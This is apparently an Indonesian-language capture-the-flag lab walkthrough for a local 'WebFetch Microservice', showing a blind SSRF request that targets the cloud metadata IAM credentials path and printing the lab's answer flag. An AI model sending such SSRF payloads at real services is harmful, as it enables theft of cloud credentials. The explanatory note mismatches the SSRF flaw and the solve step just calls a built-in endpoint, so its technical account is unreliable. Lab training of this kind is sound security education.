# Panduan Praktik Terbimbing: Investigasi Full-Chain Blind SSRF to Cloud Metadata

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **WebFetch Microservice** pada `http://127.0.0.1:8060`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8060/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A10-03","port":8060,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8060/`
3. Amati antarmuka operasional **WebFetch Microservice** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (Full-Chain Blind SSRF to Cloud Metadata)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -X POST http://127.0.0.1:8060/api/fetch -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> [!NOTE]
> **Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Content-Type: application/json` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8060/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8060/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A10-03","flag":"ZITERA{ssrf_cl0ud_m3t4d4t4_3xf1ltr4t10n_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{ssrf_cl0ud_m3t4d4t4_3xf1ltr4t10n_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
